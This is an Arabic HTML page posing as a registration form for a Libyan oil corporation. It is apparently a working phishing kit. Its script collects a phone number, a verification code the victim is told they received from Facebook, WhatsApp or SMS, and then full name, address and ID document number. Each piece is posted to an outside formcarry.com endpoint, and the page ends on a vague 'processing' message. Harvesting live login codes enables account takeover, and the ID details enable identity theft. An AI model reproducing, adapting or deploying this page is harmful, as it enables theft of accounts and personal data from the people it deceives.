<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>نموذج التسجيل - مؤسسة النفط الليبية</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background: #f2f2f2;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container, .popup, #fieldsModal {
      background: #fff;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 450px;
      box-sizing: border-box;
      text-align: center;
    }

    .hidden {
      display: none;
    }

    label {
      display: block;
      margin-top: 10px;
      font-weight: bold;
      color: #003366;
      text-align: right;
    }

    input, select, button {
      width: 100%;
      padding: 10px;
      font-size: 15px;
      margin-top: 5px;
      border-radius: 6px;
      border: 1px solid #ccc;
      box-sizing: border-box;
    }

    button {
      background-color: #28a745;
      color: white;
      border: none;
      cursor: pointer;
      margin-top: 15px;
    }

    button:hover {
      background-color: #218838;
    }

    .countdown {
      font-weight: bold;
      color: #cc0000;
      margin-top: 10px;
    }
  </style>
</head>
<body>

<div class="container" id="phoneStep">
  <h2>أدخل رقم هاتفك الليبي</h2>
  <form id="phoneForm">
    <label>رقم الهاتف:</label>
    <input type="text" id="phone" required placeholder="091xxxxxxx" />
    <button type="submit">تلقي الكود</button>
  </form>
</div>

<div class="container hidden" id="codeStep">
  <h3>أدخل الكود الذي وصلك من Facebook أو WhatsApp أو SMS</h3>
  <form id="codeForm">
    <label>كود التوثيق:</label>
    <input type="text" id="code" required placeholder="كود من 6-8 أحرف أو أرقام" />
    <div class="countdown" id="countdown">08:00</div>
    <button type="submit">تأكيد الكود</button>
    <button type="button" id="resendCode">🔁 إعادة إرسال الكود</button>
  </form>
</div>

<div id="fieldsModal" class="hidden">
  <h3 style="color: #003366;">البيانات الإضافية</h3>
  <form id="fullForm">
    <label>الاسم الكامل:</label>
    <input type="text" id="fullName" required />

    <label>العنوان:</label>
    <input type="text" id="address" required />

    <label>نوع الوثيقة:</label>
    <select id="docType" required>
      <option value="">اختر نوع الوثيقة</option>
      <option value="بطاقة">بطاقة</option>
      <option value="جواز سفر">جواز سفر</option>
    </select>

    <label>رقم الوثيقة:</label>
    <input type="text" id="docNumber" required />

    <button type="submit">إرسال الطلب</button>
  </form>
</div>

<div class="container hidden" id="finalMessage">
  <h3 style="color: green;">جاري معالجة طلبك، الرجاء المراجعة في وقت آخر.</h3>
</div>

<audio id="alarmSound">
  <source src="https://www.soundjay.com/button/beep-07.wav" type="audio/wav">
</audio>

<script>
  const formcarryURL = "https://formcarry.com/s/a-Yw-WFDEqO";
  let savedPhone = "";
  let codeSubmitCount = 0;
  let timerInterval;

  document.getElementById("phoneForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const phone = document.getElementById("phone").value.trim();
    const phoneRegex = /^(091|092|094)\d{7}$/;
    if (!phoneRegex.test(phone)) {
      alert("يرجى إدخال رقم هاتف ليبي صحيح يبدأ بـ 091 أو 092 أو 094.");
      return;
    }
    savedPhone = phone;
    fetch(formcarryURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone })
    });
    document.getElementById("phoneStep").classList.add("hidden");
    document.getElementById("codeStep").classList.remove("hidden");
    startCountdown(8 * 60);
  });

  document.getElementById("codeForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const code = document.getElementById("code").value.trim();
    if (!/^[A-Za-z0-9]{6,8}$/.test(code)) {
      alert("الكود يجب أن يكون من 6 إلى 8 أرقام أو أحرف.");
      return;
    }
    codeSubmitCount++;
    fetch(formcarryURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone: savedPhone, code })
    });
    document.getElementById("codeStep").classList.add("hidden");
    document.getElementById("fieldsModal").classList.remove("hidden");
  });

  document.getElementById("resendCode").addEventListener("click", function() {
    fetch(formcarryURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone: savedPhone, resend: true })
    });
    startCountdown(8 * 60);
  });

  document.getElementById("fullForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const fullName = document.getElementById("fullName").value.trim();
    const address = document.getElementById("address").value.trim();
    const docType = document.getElementById("docType").value;
    const docNumber = document.getElementById("docNumber").value.trim();

    const arabicRegex = /^[\u0600-\u06FF\s]{8,}$/;
    if (!arabicRegex.test(fullName)) {
      alert("الاسم يجب أن يكون باللغة العربية ويحتوي على 8 أحرف أو أكثر.");
      return;
    }

    fetch(formcarryURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ fullName, address, docType, docNumber, phone: savedPhone })
    });

    document.getElementById("fieldsModal").classList.add("hidden");
    document.getElementById("finalMessage").classList.remove("hidden");
  });

  function startCountdown(duration) {
    let timer = duration, minutes, seconds;
    clearInterval(timerInterval);
    const countdown = document.getElementById("countdown");
    timerInterval = setInterval(() => {
      minutes = Math.floor(timer / 60);
      seconds = timer % 60;
      countdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      if (--timer < 0) {
        clearInterval(timerInterval);
        countdown.textContent = "انتهى الوقت!";
        document.getElementById("alarmSound").play();
      }
    }, 1000);
  }
</script>
</body>
</html>
